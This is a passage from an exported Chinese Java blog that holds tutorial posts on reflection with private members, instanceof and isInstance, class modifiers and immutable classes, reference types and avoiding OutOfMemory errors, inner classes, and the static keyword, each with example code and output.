都知道，对象是无法访问或操作类的私有变量和方法的，但是，通过反射，我们就可以做到。 下面，让我们一起探讨如何利用反射访问 类对象的私有方法 以及修改 私有变量或常量。 测试类 123456789101112public class TestClass &#123; private String MSG = \"Original\"; private void privateMethod(String head , int tail)&#123; System.out.print(head + tail); &#125; public String getMsg()&#123; return MSG; &#125;&#125; 1 访问私有方法以访问 TestClass 类中的私有方法 privateMethod(String head , int tail) 为例。 1234567891011121314151617181920212223242526272829/** * 访问对象的私有方法 * 为简洁代码，在方法上抛出总的异常，实际开发别这样 */private static void getPrivateMethod() throws Exception&#123; //1. 获取 Class 类实例 TestClass testClass = new TestClass(); Class mClass = testClass.getClass(); //2. 获取私有方法 //第一个参数为要获取的私有方法的名称 //第二个为要获取方法的参数的类型，参数为 Class...，没有参数就是null //方法参数也可这么写 ：new Class[]&#123;String.class , int.class&#125; Method privateMethod = mClass.getDeclaredMethod(\"privateMethod\", String.class, int.class); //3. 开始操作方法 if (privateMethod != null) &#123; //获取私有方法的访问权 //只是获取访问权，并不是修改实际权限 privateMethod.setAccessible(true); //使用 invoke 反射调用私有方法 //privateMethod 是获取到的私有方法 //testClass 要操作的对象 //后面两个参数传实参 privateMethod.invoke(testClass, \"Java Reflect \", 666); &#125;&#125; 需要注意的是，第3步中的 setAccessible(true) 方法，是获取私有方法的访问权限，如果不加会报异常 IllegalAccessException，因为当前方法访问权限是“private”的，如下： 1java.lang.IllegalAccessException: Class MainClass can not access a member of class obj.TestClass with modifiers \"private\" 正常运行后，打印如下，说明调用私有方法成功： 1Java Reflect 666 2 修改私有变量以修改 TestClass 类中的私有变量 MSG 为例，其初始值为 “Original” ，我们要修改为 “Modified”。 12345678910111213141516171819202122232425262728/** * 修改对象私有变量的值 * 为简洁代码，在方法上抛出总的异常 */private static void modifyPrivateFiled() throws Exception &#123; //1. 获取 Class 类实例 TestClass testClass = new TestClass(); Class mClass = testClass.getClass(); //2. 获取私有变量 Field privateField = mClass.getDeclaredField(\"MSG\"); //3. 操作私有变量 if (privateField != null) &#123; //获取私有变量的访问权 privateField.setAccessible(true); //修改私有变量，并输出以测试 System.out.println(\"Before Modify：MSG = \" + testClass.getMsg()); //调用 set(object , value) 修改变量的值 //privateField 是获取到的私有变量 //testClass 要操作的对象 //\"Modified\" 为要修改成的值 privateField.set(testClass, \"Modified\"); System.out.println(\"After Modify：MSG = \" + testClass.getMsg()); &#125;&#125; 从输出信息看出 修改私有变量 成功： 12Before Modify：MSG = OriginalAfter Modify：MSG = Modified 反射的一些注意事项由于反射会额外消耗一定的系统资源，因此如果不需要动态地创建一个对象，那么就不需要用反射。 另外，反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。 Reference 深入解析Java反射（1） - 基础 - https://www.sczyh30.com/posts/Java/java-reflection-1/ Java 反射由浅入深 | 进阶必备 - https://juejin.im/post/598ea9116fb9a03c335a99a4#heading-5","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】instanceof关键字与 isInstance方法","date":"2019-04-01T13:02:28.000Z","path":"2019/04/01/【Java】对象-instanceof关键字与-isInstance方法/","text":"instanceofinstanceof 是 Java 的一个二元操作符，类似于 ==，&gt;，&lt; 等操作符。 instanceof 是 Java 的保留关键字。它的作用是测试它左边的对象是否是它右边的类的实例，返回 boolean 的数据类型。 如果被测对象是null值，则测试结果总是false。 例子1以下实例创建了 displayObjectClass() 方法来演示 Java instanceof 关键字用法： 123456789101112131415161718import java.util.ArrayList;import java.util.Vector; public class Main &#123; public static void main(String[] args) &#123; Object testObject = new ArrayList(); displayObjectClass(testObject); &#125; public static void displayObjectClass(Object o) &#123; if (o instanceof Vector) System.out.println(\"对象是 java.util.Vector 类的实例\"); else if (o instanceof ArrayList) System.out.println(\"对象是 java.util.ArrayList 类的实例\"); else System.out.println(\"对象是 \" + o.getClass() + \" 类的实例\"); &#125;&#125; 输出结果1对象是 java.util.ArrayList 类的实例 例子2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051interface A&#123;&#125;class B implements A&#123; &#125;class C extends B &#123; &#125; class instanceoftest &#123; public static void main(String[] args)&#123; A a=null; B b=null; boolean res; System.out.println(\"instanceoftest test case 1: ------------------\"); res = a instanceof A; System.out.println(\"a instanceof A: \" + res); res = b instanceof B; System.out.println(\"b instanceof B: \" + res); System.out.println(\"/ninstanceoftest test case 2: ------------------\"); a=new B(); b=new B(); res = a instanceof A; System.out.println(\"a instanceof A: \" + res); res = a instanceof B; System.out.println(\"a instanceof B: \" + res); res = b instanceof A; System.out.println(\"b instanceof A: \" + res); res = b instanceof B; System.out.println(\"b instanceof B: \" + res); System.out.println(\"/ninstanceoftest test case 3: ------------------\"); B b2=(C)new C(); res = b2 instanceof A; System.out.println(\"b2 instanceof A: \" + res); res = b2 instanceof B; System.out.println(\"b2 instanceof B: \" + res); res = b2 instanceof C; System.out.println(\"b2 instanceof C: \" + res); &#125;&#125; 输出结果1234567891011121314instanceoftest test case 1: ------------------a instanceof A: falseb instanceof B: falseinstanceoftest test case 2: ------------------a instanceof A: truea instanceof B: trueb instanceof A: trueb instanceof B: trueinstanceoftest test case 3: ------------------b2 instanceof A: trueb2 instanceof B: trueb2 instanceof C: true isInstance isInstance是Class类的一个方法。 这个方法与instanceof等价，其中obj是被测试的对象或者变量，如果obj是调用这个方法的class或接口的实例，则返回true。如果被检测的对象是null或者基本类型，那么返回值是false。 1public boolean isInstance(Object obj) 使用方法：123if(B.Class.isInstance(a))&#123;&#125;; 表示：a 是否能强转为 B 类型。 Reference Java 实例 - instanceof 关键字用法 - http://www.runoob.com/java/method-instanceof.html java中instanceof用法 - https://blog.csdn.net/liranke/article/details/5574791","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】类的访问修饰符（Access Qualifier）","date":"2019-04-01T08:08:46.000Z","path":"2019/04/01/【Java】类-类的修饰符/","text":"abstract - 抽象类凡是用修饰符 abstract修饰的类，被称为抽象类。 抽象类与抽象方法在了解抽象类之前，先来了解一下抽象方法。抽象方法是一种特殊的方法：它只有声明，而没有具体的实现。抽象方法的声明格式为： 1abstract void fun(); 抽象方法必须用abstract关键字进行修饰。 如果一个类含有抽象方法，则称这个类为抽象类，抽象类必须在类前用abstract关键字修饰。 因为抽象类中含有无具体实现的方法，所以不能将抽象类创建对象实例。 下面要注意一个问题：在《Java编程思想》一书中，将抽象类定义为“包含抽象方法的类”，但是后面发现如果一个类不包含抽象方法，只是用abstract修饰的话也是抽象类。也就是说抽象类不一定必须含有抽象方法。 个人觉得这个属于钻牛角尖的问题吧，因为如果一个抽象类不包含任何抽象方法，为何还要设计为抽象类？所以暂且记住这个概念吧，不必去深究为什么。 123abstract class ClassName &#123; abstract void fun();&#125; 从这里可以看出，抽象类就是为了继承而存在的。 如果你定义了一个抽象类，却不去继承它，那么等于白白创建了这个抽象类，因为你不能用它来做任何事情。 对于一个父类，如果它的某个方法在父类中实现出来没有任何意义，必须根据子类的实际需求来进行不同的实现，那么就可以将这个方法声明为abstract方法，此时这个类也就成为abstract类了。 包含抽象方法的类称为抽象类，但并不意味着抽象类中只能有抽象方法，它和普通类一样，同样可以拥有成员变量和普通的成员方法。 注意，抽象类和普通类的主要有三点区别： 抽象方法必须为public或者protected，缺省情况下默认为public（因为如果为private，则不能被子类继承，子类便无法实现该方法）。 不能创建抽象类的实例对象； 如果一个类继承于一个抽象类，则子类必须实现父类的所有抽象方法。如果子类没有实现父类的抽象方法，则必须将子类也定义为为abstract类。 final - 最终类当一个类被final修饰时，该类不能被继承。 子类继承往往可以重写父类的方法和改变父类属性，会带来一定的安全隐患。因此，当一个类不希望被继承时就，可以使用final修饰。 被定义为 final 类通常是一些有固定作用、用来完成某种标准功能的类。如Java系统定义好的用来实现网络功能的InetAddress、Socket等类都是 final类。 注意：修饰符 abstract 和修饰符 final 不能同时修饰同一个类，因为abstract类是没有具体对象的类，它必须有子类，即就是是用来被继承的；而 final类是不可能有子类的类，所以用abstract和final修饰同一个类是无意义的。 最终类最终类的意思是创建该类的实例后，该实例变量是不可改变的。 最终类有很多好处，譬如它们的对象是只读的，可以在多线程环境下安全的共享，不用额外的同步开销等等。 条件声明一个最终类，需要满足以下条件： 使用private和final修饰符来修饰该类的所有成员变量 提供带参的构造器用于初始化类的成员变量； 仅为该类的成员变量提供getter方法，不提供setter方法，因为普通方法无法修改fina修饰的成员变量； 在getter方法中，不要直接返回对象本身，而是克隆对象，并返回对象的拷贝； 通过构造器初始化所有成员时，进行深拷贝（deep copy）； 如果有必要就重写Object类的hashCode()和equals()方法，应该保证用equals()判断相同的两个对象其Hashcode值也是相等的。 例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687public final class FinalClassExample &#123; private final int id; private final String name; private final HashMap testMap; public int getId() &#123; return id; &#125; public String getName() &#123; return name; &#125; /** * 可变对象的访问方法 */ public HashMap getTestMap() &#123; //return testMap; return (HashMap) testMap.clone(); &#125; /** * 实现深拷贝(deep copy)的构造器 */ public FinalClassExample(int i, String n, HashMap hm)&#123; System.out.println(\"Performing Deep Copy for Object initialization\"); this.id=i; this.name=n; HashMap tempMap=new HashMap(); String key; Iterator it = hm.keySet().iterator(); while(it.hasNext())&#123; key=it.next(); tempMap.put(key, hm.get(key)); &#125; this.testMap=tempMap; &#125; /** * 实现浅拷贝(shallow copy)的构造器 */ /** public FinalClassExample(int i, String n, HashMap hm)&#123; System.out.println(\"Performing Shallow Copy for Object initialization\"); this.id=i; this.name=n; this.testMap=hm; &#125; */ /** * 测试浅拷贝的结果 * 为了创建最终类，要使用深拷贝 * @param args */ public static void main(String[] args) &#123; HashMap h1 = new HashMap(); h1.put(\"1\", \"first\"); h1.put(\"2\", \"second\"); String s = \"original\"; int i=10; FinalClassExample ce = new FinalClassExample(i,s,h1); //Lets see whether its copy by field or reference System.out.println(s==ce.getName()); System.out.println(h1 == ce.getTestMap()); //print the ce values System.out.println(\"ce id:\"+ce.getId()); System.out.println(\"ce name:\"+ce.getName()); System.out.println(\"ce testMap:\"+ce.getTestMap()); //change the local variable values i=20; s=\"modified\"; h1.put(\"3\", \"third\"); //print the values again System.out.println(\"ce id after local variable change:\"+ce.getId()); System.out.println(\"ce name after local variable change:\"+ce.getName()); System.out.println(\"ce testMap after local variable change:\"+ce.getTestMap()); HashMap hmTest = ce.getTestMap(); hmTest.put(\"4\", \"new\"); System.out.println(\"ce testMap after changing variable from accessor methods:\"+ce.getTestMap()); &#125;&#125; 输出 12345678910Performing Deep Copy for Object initializationtruefalsece id:10ce name:originalce testMap:&#123;2=second, 1=first&#125;ce id after local variable change:10ce name after local variable change:originalce testMap after local variable change:&#123;2=second, 1=first&#125;ce testMap after changing variable from accessor methods:&#123;2=second, 1=first&#125; 现在我们注释掉深拷贝的构造器，取消对浅拷贝构造器的注释。也对getTestMap()方法中的返回语句取消注释，返回实际的对象引用。然后再一次执行代码。 12345678910Performing Shallow Copy for Object initializationtruetruece id:10ce name:originalce testMap:&#123;2=second, 1=first&#125;ce id after local variable change:10ce name after local variable change:originalce testMap after local variable change:&#123;3=third, 2=second, 1=first&#125;ce testMap after changing variable from accessor methods:&#123;3=third, 2=second, 1=first, 4=new&#125; 从输出可以看出，HashMap的值被更改了，因为构造器实现的是浅拷贝，而且在getter方法中返回的是原本对象的引用。 JDK中提供的八个包装类和String类都是最终类，我们来看看String的实现。 12345678910111213141516171819202122public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[]; /** Cache the hash code for the string */ private int hash; // Default to 0 /** use serialVersionUID from JDK 1.0.2 for interoperability */ private static final long serialVersionUID = -6849794470754667710L; /** * Class String is special cased within the Serialization Stream Protocol. * * A String instance is written into an ObjectOutputStream according to * &lt;a href=\"&#123;@docRoot&#125;/../platform/serialization/spec/output.html\"&gt; * Object Serialization Specification, Section 6.2, \"Stream Elements\"&lt;/a&gt; */ private static final ObjectStreamField[] serialPersistentFields = new ObjectStreamField[0]; ...&#125; 可以看出String的value就是final修饰的，上述其他几条性质也是吻合的。 Reference Java中的类修饰符 - https://www.cnblogs.com/Goden/p/3811001.ht 接口和抽象类 - https://www.cnblogs.com/dolphin0520/p/3811437.html 《The Art of Java Concurrency Programming》 你以为你真的了解final吗？ - https://juejin.im/post/5ae9b82c6fb9a07ac3634941","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java中的引用与如何避免OutOfMemory","date":"2019-04-01T07:37:31.000Z","path":"2019/04/01/【Java】引用-Java中的引用与如何避免OutOfMemory/","text":"背景想必很多朋友对OOM（OutOfMemory）这个错误不会陌生，而当遇到这种错误如何有效地解决这个问题呢？今天我们就来说一下如何利用软引用和弱引用来有效地解决程序中出现的OOM问题。 Java中的引用 在Java中，虽然不需要程序员手动去管理对象的生命周期，但是如果希望某些对象具备一定的生命周期的话（比如内存不足时JVM就会自动回收某些对象从而避免OutOfMemory的错误）就需要用到软引用和弱引用了。 从Java SE2开始，就提供了四种类型的引用：强引用（strong reference）、软引用（soft reference）、弱引用（weak reference）和虚引用（phamthom reference）。 Java中提供这四种引用类型主要有两个目的： 可以让程序员通过代码的方式决定某些对象的生命周期； 有利于JVM进行垃圾回收。 下面来阐述一下这四种类型引用的概念： 强引用（Strong Reference）强引用就是指在程序代码之中普遍存在的，比如下面这段代码中的object和str都是强引用： 12Object object = new Object();String str = \"hello\"; 只要某个对象有强引用与之关联，JVM必定不会回收这个对象，即使在内存不足的情况下，JVM宁愿抛出OutOfMemory错误，也不会回收这种对象。 例子比如下面这段代码： 12345678910public class Main &#123; public static void main(String[] args) &#123; new Main().fun1(); &#125; public void fun1() &#123; Object object = new Object(); Object[] objArr = new Object[1000]; &#125;&#125; 分析当运行至 Object[] objArr = new Object[1000]; 这句时，如果内存不足，JVM会抛出OOM错误也不会回收object指向的对象。不过要注意的是，当fun1运行完之后，object和objArr都已经不存在了，所以它们指向的对象都会被JVM回收。 如果想中断强引用和某个对象之间的关联，可以显示地将引用赋值为null，这样一来的话，JVM在合适的时间就会回收该对象。 比如Vector类的clear方法中就是通过将引用赋值为null来实现清理工作的： 12345678910111213141516171819202122232425/** * Removes the element at the specified position in this Vector. * Shifts any subsequent elements to the left (subtracts one from their * indices). Returns the element that was removed from the Vector. * * @throws ArrayIndexOutOfBoundsException if the index is out of range * (&#123;@code index &lt; 0 || index &gt;= size()&#125;) * @param index the index of the element to be removed * @return element that was removed * @since 1.2 */ public synchronized E remove(int index) &#123; modCount++; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); Object oldValue = elementData[index]; int numMoved = elementCount - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--elementCount] = null; // Let gc do its work return (E)oldValue; &#125; 软引用（Soft Reference）软引用是用来描述一些有用但并不是必需的对象，在Java中用java.lang.ref.SoftReference类来表示。 对于软引用关联着的对象，只有在内存不足的时候，JVM才会回收该对象。 因此，这一点可以很好地用来解决OOM的问题，并且这个特性很适合用来实现缓存：比如网页缓存、图片缓存等。 软引用可以和一个引用队列（ReferenceQueue）联合使用，如果软引用所引用的对象被JVM回收，这个软引用就会被加入到与之关联的引用队列中。下面是一个使用示例： 123456789import java.lang.ref.SoftReference; public class Main &#123; public static void main(String[] args) &#123; SoftReference&lt;String&gt; sr = new SoftReference&lt;String&gt;(new String(\"hello\")); System.out.println(sr.get()); &#125;&#125; 弱引用（Weak Reference）弱引用（Weak Reference）也是用来描述非必需对象的，当JVM每次进行垃圾回收时，无论内存是否充足，都会回收被弱引用关联的对象。 在java中，用java.lang.ref.WeakReference类来表示。 示范下面是使用示例： 123456789101112import java.lang.ref.WeakReference; public class Main &#123; public static void main(String[] args) &#123; WeakReference&lt;String&gt; sr = new WeakReference&lt;String&gt;(new String(\"hello\")); System.out.println(sr.get()); System.gc(); //通知JVM的gc进行垃圾回收 System.out.println(sr.get()); &#125;&#125; 输出结果12hellonull 分析 第二个输出结果是null，这说明只要JVM进行垃圾回收，被弱引用关联的对象必定会被回收掉。 不过要注意的是，这里所说的被弱引用关联的对象是指只有弱引用与之关联，如果存在强引用同时与之关联，则进行垃圾回收时也不会回收该对象（软引用也是如此）。 弱引用和引用队列（ReferenceQueue）弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被JVM回收，这个软引用就会被加入到与之关联的引用队列中。 虚引用（PhantomReference）虚引用和前面的软引用、弱引用不同，它并不影响对象的生命周期。 在java中用java.lang.ref.PhantomReference类表示。如果一个对象与虚引用关联，则跟没有引用与之关联一样，在任何时候都可能被垃圾回收器回收。 要注意的是，虚引用必须和引用队列关联使用，当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会把这个虚引用加入到与之关联的引用队列中。 程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。如果程序发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。 1234567891011import java.lang.ref.PhantomReference;import java.lang.ref.ReferenceQueue; public class Main &#123; public static void main(String[] args) &#123; ReferenceQueue&lt;String&gt; queue = new ReferenceQueue&lt;String&gt;(); PhantomReference&lt;String&gt; pr = new PhantomReference&lt;String&gt;(new String(\"hello\"), queue); System.out.println(pr.get()); &#125;&#125; 进一步理解软引用和弱引用对于强引用，我们平时在编写代码时经常会用到。 而对于其他三种类型的引用，使用得最多的就是软引用和弱引用，这2种既有相似之处又有区别。它们都是用来描述非必需对象的，但是被软引用关联的对象只有在内存不足时才会被回收，而被弱引用关联的对象在JVM进行垃圾回收时总会被回收。 在SoftReference类中，有三个方法，两个构造方法和一个get方法（WekReference类似）： 两个构造方法： 123456789public SoftReference(T referent) &#123; super(referent); this.timestamp = clock;&#125; public SoftReference(T referent, ReferenceQueue&lt;? super T&gt; q) &#123; super(referent, q); this.timestamp = clock;&#125; get方法用来获取与软引用关联的对象的引用，如果该对象被回收了，则返回null。 在使用软引用和弱引用的时候，我们可以显示地通过System.gc()来通知JVM进行垃圾回收，但是要注意的是，虽然发出了通知，JVM不一定会立刻执行，也就是说这句是无法确保此时，JVM一定会进行垃圾回收的。 如何利用软引用和弱引用解决OOM问题 前面讲了关于软引用和弱引用相关的基础知识，那么到底如何利用它们来优化程序性能，从而避免OOM的问题呢？ 下面举个例子，假如有一个应用需要读取大量的本地图片，如果每次读取图片都从硬盘读取，则会严重影响性能，但是如果全部加载到内存当中，又有可能造成内存溢出，此时使用软引用可以解决这个问题。 设计思路是：用一个HashMap来保存图片的路径和相应图片对象关联的软引用之间的映射关系，在内存不足时，JVM会自动回收这些缓存图片对象所占用的空间，从而有效地避免了OOM的问题。在Android开发中对于大量图片下载会经常用到。 12345678910111213141516171819202122232425.....private Map&lt;String, SoftReference&lt;Bitmap&gt;&gt; imageCache = new HashMap&lt;String, SoftReference&lt;Bitmap&gt;&gt;();....public void addBitmapToCache(String path) &#123; // 强引用的Bitmap对象 Bitmap bitmap = BitmapFactory.decodeFile(path); // 软引用的Bitmap对象 SoftReference&lt;Bitmap&gt; softBitmap = new SoftReference&lt;Bitmap&gt;(bitmap); // 添加该对象到Map中使其缓存 imageCache.put(path, softBitmap);&#125;public Bitmap getBitmapByPath(String path) &#123; // 从缓存中取软引用的Bitmap对象 SoftReference&lt;Bitmap&gt; softBitmap = imageCache.get(path); // 判断是否存在软引用 if (softBitmap == null) &#123; return null; &#125; // 取出Bitmap对象，如果由于内存不足Bitmap被回收，将取得空 Bitmap bitmap = softBitmap.get(); return bitmap;&#125; 当然这里我们把缓存替换策略交给了JVM去执行，这是一种比较简单的处理方法。复杂一点的缓存，我们可以自己单独设计一个类，这里面就涉及到缓存策略的问题了。 Reference 如何避免OOM(OutOfMemory) - https://www.cnblogs.com/dolphin0520/p/3784171.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】内部类（Inner Class）","date":"2019-04-01T05:08:36.000Z","path":"2019/04/01/【Java】类-内部类/","text":"内部类基础在Java中，可以将一个类定义在另一个类里面或者一个方法里面，这样的类称为内部类。 广泛意义上的内部类一般来说包括这四种：成员内部类、局部内部类、匿名内部类和静态内部类。 下面就先来了解一下这四种内部类的用法。 成员内部类成员内部类是最普通的内部类，它的定义为位于另一个类的内部，形如下面的形式： 12345678910111213class Circle &#123; double radius = 0; public Circle(double radius) &#123; this.radius = radius; &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(\"drawshape\"); &#125; &#125;&#125; 这样看起来，类Draw像是类Circle的一个成员，Circle称为外部类。 成员内部类访问外部类成员内部类可以无条件访问外部类的所有成员属性和成员方法（包括private成员和静态成员）。 1234567891011121314class Circle &#123; private double radius = 0; public static int count =1; public Circle(double radius) &#123; this.radius = radius; &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(radius); //外部类的private成员 System.out.println(count); //外部类的静态成员 &#125; &#125;&#125; 不过要注意的是，当成员内部类拥有和外部类同名的成员变量或者方法时，会发生隐藏现象，即默认情况下访问的是成员内部类的成员。如果要访问外部类的同名成员，需要以下面的形式进行访问： 12外部类.this.成员变量;外部类.this.成员方法; 外部类访问成员内部类虽然成员内部类可以无条件地访问外部类的成员，而外部类想访问成员内部类的成员却不是这么随心所欲了。 在外部类中如果要访问成员内部类的成员，必须先创建一个成员内部类的对象，再通过指向这个对象的引用来访问： 123456789101112131415161718class Circle &#123; private double radius = 0; public Circle(double radius) &#123; this.radius = radius; getDrawInstance().drawSahpe(); //必须先创建成员内部类的对象，再进行访问 &#125; private Draw getDrawInstance() &#123; return new Draw(); &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(radius); //外部类的private成员 &#125; &#125;&#125; 成员内部类是依附外部类而存在的，也就是说，如果要创建成员内部类的对象，前提是必须存在一个外部类的对象。 创建成员内部类创建成员内部类对象的一般方式如下： 1234567891011121314151617181920212223242526272829public class Test &#123; public static void main(String[] args) &#123; //第一种方式： Outter outter = new Outter(); Outter.Inner inner = outter.new Inner(); //必须通过Outter对象来创建 //第二种方式： Outter.Inner inner1 = outter.getInnerInstance(); &#125;&#125; class Outter &#123; private Inner inner = null; public Outter() &#123; &#125; public Inner getInnerInstance() &#123; if(inner == null) inner = new Inner(); return inner; &#125; class Inner &#123; public Inner() &#123; &#125; &#125;&#125; 内部类可以拥有private访问权限、protected访问权限、public访问权限及包访问权限。比如上面的例子，如果成员内部类Inner用private修饰，则只能在外部类的内部访问，如果用public修饰，则任何地方都能访问；如果用protected修饰，则只能在同一个包下或者继承外部类的情况下访问；如果是默认访问权限，则只能在同一个包下访问。这一点和外部类有一点不一样，外部类只能被public和包访问两种权限修饰。我个人是这么理解的，由于成员内部类看起来像是外部类的一个成员，所以可以像类的成员一样拥有多种权限修饰。 局部内部类局部内部类是定义在一个方法或者一个作用域里面的类，它和成员内部类的区别在于局部内部类的访问仅限于方法内或者该作用域内。 123456789101112131415161718class People&#123; public People() &#123; &#125;&#125; class Man&#123; public Man()&#123; &#125; public People getWoman()&#123; class Woman extends People&#123; //局部内部类 int age =0; &#125; return new Woman(); &#125;&#125; 注意，局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的。 匿名内部类匿名内部类应该是平时我们编写代码时用得最多的，在编写事件监听的代码时使用匿名内部类不但方便，而且使代码更加容易维护。下面这段代码是一段Android事件监听代码： 12345678910111213scan_bt.setOnClickListener(new OnClickListener() &#123; @Override public void onClick (View v)&#123; // TODO Auto-generated method stub &#125;&#125;); history_bt.setOnClickListener(new OnClickListener() &#123; @Override public void onClick (View v)&#123; // TODO Auto-generated method stub &#125;&#125;); 这段代码为两个按钮设置监听器，这里面就使用了匿名内部类。这段代码中的： 123456new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; 就是匿名内部类的使用。代码中需要给按钮设置监听器对象，使用匿名内部类能够在实现父类或者接口中的方法情况下同时产生一个相应的对象，但是前提是这个父类或者接口必须先存在才能这样使用。当然像下面这种写法也是可以的，跟上面使用匿名内部类达到效果相同。 123456789101112131415161718192021private void setListener()&#123; scan_bt.setOnClickListener(new Listener1()); history_bt.setOnClickListener(new Listener2());&#125; class Listener1 implements View.OnClickListener&#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; class Listener2 implements View.OnClickListener&#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; 这种写法虽然能达到一样的效果，但是既冗长又难以维护，所以一般使用匿名内部类的方法来编写事件监听代码。同样的，匿名内部类也是不能有访问修饰符和static修饰符的。 匿名内部类是唯一一种没有构造器的类。正因为其没有构造器，所以匿名内部类的使用范围非常有限，大部分匿名内部类用于接口回调。匿名内部类在编译的时候由系统自动起名为Outter$1.class。一般来说，匿名内部类用于继承其他类或是实现接口，并不需要增加额外的方法，只是对继承方法的实现或是重写。 静态内部类静态内部类也是定义在另一个类里面的类，只不过在类的前面多了一个关键字static。静态内部类是不需要依赖于外部类的，这点和类的静态成员属性有点类似，并且它不能使用外部类的非static成员变量或者方法，这点很好理解，因为在没有外部类的对象的情况下，可以创建静态内部类的对象，如果允许访问外部类的非static成员就会产生矛盾，因为外部类的非static成员必须依附于具体的对象。 1234567891011121314151617public class Test &#123; public static void main(String[] args) &#123; Outter.Inner inner = new Outter.Inner(); &#125;&#125; class Outter &#123; public Outter() &#123; &#125; static class Inner &#123; public Inner() &#123; &#125; &#125;&#125; 深入理解内部类1 为什么成员内部类可以无条件访问外部类的成员？内部类的使用场景和好处为什么在Java中需要内部类？总结一下主要有以下四点： 每个内部类都能独立的继承一个接口的实现，所以无论外部类是否已经继承了某个(接口的)实现，对于内部类都没有影响。内部类使得多继承的解决方案变得完整， 方便将存在一定逻辑关系的类组织在一起，又可以对外界隐藏。 方便编写事件驱动程序 方便编写线程代码 个人觉得第一点是最重要的原因之一，内部类的存在使得Java的多继承机制变得更加完善。 常见的与内部类相关的笔试面试题Reference Java内部类详解 - https://www.cnblogs.com/dolphin0520/p/3811445.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java关键字-static 关键字","date":"2019-04-01T04:10:47.000Z","path":"2019/04/01/【Java】Java关键字-static关键字/","text":"static关键字的用途在《Java编程思想》P86页有这样一段话： “static方法就是没有this的方法。在static方法内部不能调用非静态方法，反过来是可以的。而且可以在没有创建任何对象的前提下，仅仅通过类本身来调用static方法。这实际上正是static方法的主要用途。” 这段话虽然只是说明了static方法的特殊之处，但是可以看出static关键字的基本作用，简而言之，一句话来描述就是： 方便在没有创建对象的情况下来进行调用（方法/变量）。 很显然，被static关键字修饰的方法或者变量不需要依赖于对象来进行访问，只要类被加载了，就可以通过类名去进行访问。 static可以用来修饰类的成员方法、类的成员变量，另外可以编写static代码块来优化程序性能。 静态方法（static方法）static方法一般称作静态方法，由于静态方法不依赖于任何对象就可以进行访问，因此对于静态方法来说，是没有this的，因为它不依附于任何对象，既然都没有对象，就谈不上this了。 并且由于这个特性，在静态方法中不能访问类的非静态成员变量和非静态成员方法，因为非静态成员方法/变量都是必须依赖具体的对象才能够被调用。 但是要注意的是，虽然在静态方法中不能访问非静态成员方法和非静态成员变量，但是在非静态成员方法中是可以访问静态成员方法/变量的。 而对于非静态成员方法，它访问静态成员方法/变量显然是毫无限制的。 因此，如果说想在不创建对象的情况下调用某个方法，就可以将这个方法设置为static。我们最常见的static方法就是main方法，至于为什么main方法必须是static的，现在就很清楚了。因为程序在执行main方法的时候没有创建任何对象，因此只有通过类名来访问。 静态变量（static变量）static变量也称作静态变量，静态变量和非静态变量的区别是：静态变量被所有的对象所共享，在内存中只有一个副本，它当且仅当在类初次加载时会被初始化。而非静态变量是对象所拥有的，在创建对象的时候被初始化，存在多个副本，各个对象拥有的副本互不影响。 static成员变量的初始化顺序按照定义的顺序进行初始化。 static代码块static关键字还有一个比较关键的作用，就是用来形成静态代码块以优化程序性能。static块可以置于类中的任何地方，类中可以有多个static块。 在类初次被加载的时候，会按照static块的顺序来执行每个static块，并且只会执行一次。 例子为什么说static块可以用来优化程序性能，是因为它的特性：只会在类被加载的时候被执行一次。下面看个例子: 12345678910111213class Person&#123; private Date birthDate; public Person(Date birthDate) &#123; this.birthDate = birthDate; &#125; boolean isBornBoomer() &#123; Date startDate = Date.valueOf(\"1946\"); Date endDate = Date.valueOf(\"1964\"); return birthDate.compareTo(startDate)&gt;=0 &amp;&amp; birthDate.compareTo(endDate) &lt; 0; &#125;&#125; isBornBoomer是用来这个人是否是1946-1964年出生的，而每次isBornBoomer被调用的时候，都会生成startDate和birthDate两个对象，造成了空间浪费，如果改成这样效率会更好： 12345678910111213141516class Person&#123; private Date birthDate; private static Date startDate,endDate; static&#123; startDate = Date.valueOf(\"1946\"); endDate = Date.valueOf(\"1964\"); &#125; public Person(Date birthDate) &#123; this.birthDate = birthDate; &#125; boolean isBornBoomer() &#123; return birthDate.compareTo(startDate)&gt;=0 &amp;&amp; birthDate.compareTo(endDate) &lt; 0; &#125;&#125; 因此，很多时候会将一些只需要进行一次的初始化操作都放在static代码块中进行。 